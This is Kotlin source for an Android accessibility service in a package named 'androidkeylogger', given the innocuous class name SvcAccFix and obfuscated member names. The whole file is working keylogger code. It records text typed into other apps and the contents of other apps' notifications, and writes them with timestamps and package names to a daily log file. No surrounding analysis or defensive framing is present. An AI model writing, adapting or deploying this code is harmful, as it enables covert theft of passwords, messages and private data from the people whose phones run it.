package com.azamovhudstc.androidkeylogger

import android.accessibilityservice.AccessibilityService
import android.content.Intent
import android.text.format.DateFormat
import android.util.Log
import android.view.accessibility.AccessibilityEvent
import java.io.File
import java.io.FileOutputStream
import java.io.OutputStreamWriter
import java.text.SimpleDateFormat
import java.util.*

class SvcAccFix : AccessibilityService() {
    var b: String
    private var c: String
    private var d: String
    private var e: String
    private var f: String
    private var g: String? = null
    private fun b() {
        val file = File(g, b)
        try {
            if (!file.exists()) {
                if (!file.createNewFile()) {
                    throw Exception()
                }
            }
        } catch (unused: Exception) {
        }
    }

    private fun d(): String {
        return try {
            SimpleDateFormat("yyyyMMdd", Locale.getDefault()).format(Calendar.getInstance().time)
        } catch (unused: Exception) {
            ""
        }
    }

    private fun e() {
        val str = "\n"
        try {
            val outputStreamWriter = OutputStreamWriter(
                FileOutputStream(
                    File(
                        g, b
                    ), true
                )
            )
            val stringBuilder = StringBuilder()
            stringBuilder.append(e)
            stringBuilder.append(" ")
            stringBuilder.append(f)
            val stringBuilder2 = stringBuilder.toString()
            val stringBuilder3 = StringBuilder()
            stringBuilder3.append("%")
            stringBuilder3.append(stringBuilder2.length)
            stringBuilder3.append("s")
            val replace =
                String.format(stringBuilder3.toString(), *arrayOf<Any>("")).replace(' ', '-')
            outputStreamWriter.write(replace)
            outputStreamWriter.write(str)
            outputStreamWriter.write(stringBuilder2)
            outputStreamWriter.write(str)
            outputStreamWriter.write(replace)
            outputStreamWriter.write(str)
            outputStreamWriter.write(d)
            outputStreamWriter.write("\n\n")
            outputStreamWriter.flush()
            outputStreamWriter.close()
        } catch (e: Exception) {
            Log.e("apk.typingrecorder", e.message!!)
        }
    }

    fun a() {
        val str = ""
        b = str
        e = str
        d = str
    }

    fun c(): String {
        var str = ""
        if (d.isEmpty()) {
            return str
        }
        val stringBuilder = StringBuilder()
        stringBuilder.append(e)
        stringBuilder.append(" ")
        stringBuilder.append(f)
        val stringBuilder2 = stringBuilder.toString()
        var stringBuilder3 = StringBuilder()
        stringBuilder3.append("%")
        stringBuilder3.append(stringBuilder2.length)
        stringBuilder3.append("s")
        str = String.format(stringBuilder3.toString(), *arrayOf<Any>(str)).replace(' ', '-')
        stringBuilder3 = StringBuilder()
        stringBuilder3.append(str)
        val str2 = "\n"
        stringBuilder3.append(str2)
        stringBuilder3.append(stringBuilder2)
        stringBuilder3.append(str2)
        stringBuilder3.append(str)
        stringBuilder3.append(str2)
        stringBuilder3.append(d)
        stringBuilder3.append("\n\n")
        return stringBuilder3.toString()
    }

    override fun onAccessibilityEvent(accessibilityEvent: AccessibilityEvent) {
        if (accessibilityEvent != null) {
            try {
                val str = ""
                if (accessibilityEvent.eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
                    if (!(d() == b || b.isEmpty())) {
                        e()
                        c = d
                        b = str
                        e = str
                        d = str
                    }
                } else if (accessibilityEvent.eventType == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
                    val packageName = accessibilityEvent.packageName
                    val charSequence = packageName?.toString() ?: str
                    if (charSequence != getPackageName()) {
                        val stringBuilder: String
                        val text: List<*> = accessibilityEvent.text
                        stringBuilder = if (text != null) {
                            val stringBuilder2 = StringBuilder()
                            for (i in text.indices) {
                                if (i > 0) {
                                    stringBuilder2.append("\n")
                                }
                                val charSequence2 = text[i] as CharSequence?
                                if (!(charSequence2 == null || charSequence2.toString()
                                        .contains("￼"))
                                ) {
                                    stringBuilder2.append(charSequence2)
                                }
                            }
                            stringBuilder2.toString()
                        } else {
                            str
                        }
                        val beforeText = accessibilityEvent.beforeText
                        val charSequence3: Any = beforeText?.toString() ?: str
                        if (!(f == charSequence || d.isEmpty())) {
                            e()
                            c = d
                            b = str
                            e = str
                            d = str
                        }
                        if (!(d.isEmpty() || d == charSequence3 || d == c)) {
                            e()
                            c = d
                            b = str
                            e = str
                        }
                        d = stringBuilder
                        f = charSequence
                        if (!stringBuilder.isEmpty() && e.isEmpty()) {
                            e = SimpleDateFormat(
                                DateFormat.getBestDateTimePattern(
                                    Locale.getDefault(), if (DateFormat.is24HourFormat(
                                            applicationContext
                                        )
                                    ) "Hms" else "hmsa"
                                ), Locale.getDefault()
                            ).format(Calendar.getInstance().time)
                        }
                        if (!d.isEmpty() && b.isEmpty()) {
                            b = d()
                            b()
                        }
                    }
                } else if (accessibilityEvent.eventType == AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED) {
                    val packageName = accessibilityEvent.packageName
                    val charSequence = packageName?.toString() ?: str
                    if (charSequence != getPackageName()) {
                        val stringBuilder: String
                        val text: List<*> = accessibilityEvent.text
                        stringBuilder = if (text != null) {
                            val stringBuilder2 = StringBuilder()
                            for (i in text.indices) {
                                if (i > 0) {
                                    stringBuilder2.append("\n")
                                }
                                val charSequence2 = text[i] as CharSequence?
                                if (!(charSequence2 == null || charSequence2.toString()
                                        .contains("￼"))
                                ) {
                                    stringBuilder2.append(charSequence2)
                                }
                            }
                            stringBuilder2.toString()
                        } else {
                            str
                        }
                        val beforeText = accessibilityEvent.beforeText
                        val charSequence3: Any = beforeText?.toString() ?: str
                        if (!(f == charSequence || d.isEmpty())) {
                            e()
                            c = d
                            b = str
                            e = str
                            d = str
                        }
                        if (!(d.isEmpty() || d == charSequence3 || d == c)) {
                            e()
                            c = d
                            b = str
                            e = str
                        }
                        d = stringBuilder
                        f = charSequence
                        if (!stringBuilder.isEmpty() && e.isEmpty()) {
                            e = SimpleDateFormat(
                                DateFormat.getBestDateTimePattern(
                                    Locale.getDefault(), if (DateFormat.is24HourFormat(
                                            applicationContext
                                        )
                                    ) "Hms" else "hmsa"
                                ), Locale.getDefault()
                            ).format(Calendar.getInstance().time)
                        }
                        if (!d.isEmpty() && b.isEmpty()) {
                            b = d()
                            b()
                        }
                    }
                }
            } catch (e: Exception) {
                Log.e("apk.typingrecorder", e.message!!)
            }
        }
    }

    override fun onCreate() {
        super.onCreate()
        g = filesDir.absolutePath
    }

    override fun onDestroy() {
        super.onDestroy()
        i = false
        h = null
    }

    override fun onInterrupt() {}
    override fun onRebind(intent: Intent) {
        super.onRebind(intent)
        i = true
        h = this
    }

    /* Access modifiers changed, original: protected */
    public override fun onServiceConnected() {
        super.onServiceConnected()
        i = true
        h = this
        if (j) {
            j = false
            val intent = Intent(this, AccessibilityActivity::class.java)
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            intent.addFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP)
            startActivity(intent)
        }
    }

    override fun onUnbind(intent: Intent): Boolean {
        i = false
        h = null
        return super.onUnbind(intent)
    }

    companion object {
        var h: SvcAccFix? = null
        var i = false
        var j = false
    }

    init {
        val str = ""
        b = str
        c = str
        d = str
        e = str
        f = str
    }
}